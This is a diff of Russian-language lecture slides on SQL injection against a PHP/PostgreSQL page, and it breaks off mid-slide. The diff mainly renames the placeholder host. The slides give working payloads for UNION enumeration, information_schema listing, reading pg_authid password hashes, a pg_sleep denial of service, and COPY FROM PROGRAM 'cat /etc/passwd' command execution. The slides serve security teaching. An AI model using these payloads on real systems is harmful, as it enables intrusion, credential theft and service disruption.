@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="x-ua-compatible" content="ie=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta name="generator" content="Hugo 0.105.0">
+	<meta name="generator" content="Hugo 0.110.0">
 	
 	<link rel="icon" href="../common/lecture.png" />
 	
@@ -631,16 +631,16 @@ GRANT SELECT (col1), UPDATE (col1) ON mytable TO miriam_rw;
 <section class="slide">
     <h2>SQL-injection: Строковой параметр</h2>
     <ul>
-        <li>http://xxx/news.php?id=1
+        <li>https://your.awesome.service/news.php?id=1
             <pre><code class="sql">SELECT * FROM news WHERE id='<mark>$id</mark>'</code></pre>
         </li>
-        <li>http://xxx/news.php?id=1'
+        <li>https://your.awesome.service/news.php?id=1'
             <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1'</mark>'
 </code></pre>
             <pre><code>pg_query(): Query failed: ERROR: unterminated quoted…
 </code></pre>
         </li>
-        <li>http://xxx/news.php?id=1'%20--%20
+        <li>https://your.awesome.service/news.php?id=1'%20--%20
             <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' -- </mark>'
 </code></pre>
         </li>
@@ -670,40 +670,40 @@ WHERE (login='Admin' AND pass='123') OR (login='Admin')
 <section class="slide">
     <h2>SQL-injection: UNION</h2>
     <ul>
-        <li><code>http://xxx/news.php?id=1' UNION SELECT null --</code>
+        <li><code>https://your.awesome.service/news.php?id=1' UNION SELECT null --</code>
             <pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' UNION SELECT null --</mark>'</code></pre>
             <code>pg_query(): Query failed: ERROR: each UNION query must have the same number of columns</code></li>
 
-        <li><code>http://xxx/news.php?id=1' UNION SELECT null, null --</code><br/>
-            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
+        <li><code>https://your.awesome.service/news.php?id=1' UNION SELECT null, null --</code><br/>
+            О! Отобразилось точно также как и <code>https://your.awesome.service/news.php?id=1</code></li>
     </ul>
 </section>
 
 <section class="slide">
     <h2>SQL-injection: GROUP BY/ORDER BY</h2>
     <ul>
-        <li>http://xxx/news.php?id=1' GROUP BY 1, 2, 3, 4 --</li>
+        <li>https://your.awesome.service/news.php?id=1' GROUP BY 1, 2, 3, 4 --</li>
         <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
 GROUP BY 1, 2, 3, 4 --</mark>'</code></pre>
         <pre><code>pg_query(): Query failed: ERROR: GROUP BY position 3</code></pre>
         </li>
 
-        <li>http://xxx/news.php?id=1' ORDER BY 4 --</li>
+        <li>https://your.awesome.service/news.php?id=1' ORDER BY 4 --</li>
         <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>1'
 ORDER BY 4 --</mark>'</code></pre>
         <pre><code>pg_query(): Query failed: ERROR: ORDER BY position 4</code></pre>
         </li>
 
-        <li><code>http://xxx/news.php?id=1' GROUP BY 1, 2</code><br/>
-            <code>http://xxx/news.php?id=1' ORDER BY 2</code><br/>
-            О! Отобразилось точно также как и <code>http://xxx/news.php?id=1</code></li>
+        <li><code>https://your.awesome.service/news.php?id=1' GROUP BY 1, 2</code><br/>
+            <code>https://your.awesome.service/news.php?id=1' ORDER BY 2</code><br/>
+            О! Отобразилось точно также как и <code>https://your.awesome.service/news.php?id=1</code></li>
     </ul>
 </section>
 
 <section class="slide">
     <h2>SQL-injection: INFORMATION_SCHEMA</h2>
     <ul>
-        <li><code>http://xxx/news.php?id=-1' UNION SELECT table_schema, table_name FROM information_schema.tables
+        <li><code>https://your.awesome.service/news.php?id=-1' UNION SELECT table_schema, table_name FROM information_schema.tables
             --</code>
             <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
 UNION
@@ -716,8 +716,8 @@ FROM information_schema.tables --</mark>'</code></pre>
 <section class="slide">
     <h2>SQL-injection: Работа с файлами</h2>
     <ul>
-        <li><code>http://xxx/news.php?id=-1' UNION SELECT '.', pg_ls_dir('.') --</code></li>
-        <li><code>http://xxx/news.php?id=-1' UNION SELECT 'pg_catalog.pg_authid', encode(&#8202;pg_read_binary_file(&#8202;pg_relation_filepath(&#8202;'pg_catalog.pg_authid')),
+        <li><code>https://your.awesome.service/news.php?id=-1' UNION SELECT '.', pg_ls_dir('.') --</code></li>
+        <li><code>https://your.awesome.service/news.php?id=-1' UNION SELECT 'pg_catalog.pg_authid', encode(&#8202;pg_read_binary_file(&#8202;pg_relation_filepath(&#8202;'pg_catalog.pg_authid')),
             'hex') --</code></li>
     </ul>
 </section>
@@ -725,7 +725,7 @@ FROM information_schema.tables --</mark>'</code></pre>
 <section class="slide">
     <h2>SQL-injection: DOS атака</h2>
     <ul>
-        <li><code>http://xxx/news.php?id=-1' UNION SELECT NULL, pg_sleep(3600) --</code><br/>
+        <li><code>https://your.awesome.service/news.php?id=-1' UNION SELECT NULL, pg_sleep(3600) --</code><br/>
             <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
 UNION SELECT NULL, pg_sleep(3600) --</mark>'</code></pre>
         </li>
@@ -735,7 +735,7 @@ UNION SELECT NULL, pg_sleep(3600) --</mark>'</code></pre>
 <section class="slide">
     <h2>SQL-injection: Fatality</h2>
     <ul>
-        <li><code>http://xxx/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat
+        <li><code>https://your.awesome.service/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat
             /etc/passwd'; UPDATE news SET body = (SELECT string_agg(content, E'\n') FROM tmp1) WHERE id = 1;
             --</code><br/>
             <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1';
